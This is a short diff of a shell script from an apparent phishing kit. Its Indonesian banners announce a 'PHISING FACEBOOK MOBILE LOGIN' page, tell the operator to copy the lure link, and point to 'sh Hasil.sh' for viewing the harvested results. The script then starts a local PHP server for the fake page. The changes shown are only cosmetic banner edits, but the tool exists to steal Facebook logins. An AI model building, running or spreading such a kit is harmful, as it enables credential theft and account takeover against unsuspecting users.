@@ -71,11 +71,11 @@ then
 echo $i"Openning..."
 sleep 1
 echo $pur"now open new session and run Next.sh"
-echo $ku"____________________________________________________________________"
-echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
-echo $pur"  SALIN LINK YANG ADA DI TANDA ()"
-echo $pur"  JIKA INGIN MELIHAT HASIL BUKA SESSION BARU DAN KETIK sh Hasil.sh"
-echo $ku"____________________________________________________________________"
+echo $ku"----------------------------------------------------------------------------------"
+echo $pur"[+]PHISING FACEBOOK MOBILE LOGIN"
+echo $pur"[+]SALIN LINK YANG ADA DI TANDA ()"
+echo $pur"[+]JIKA INGIN MELIHAT HASIL BUKA SESSION BARU DAN KETIK sh Hasil.sh"
+echo $ku"----------------------------------------------------------------------------------"
 php -S localhost:8080 v2.php
 fi
 
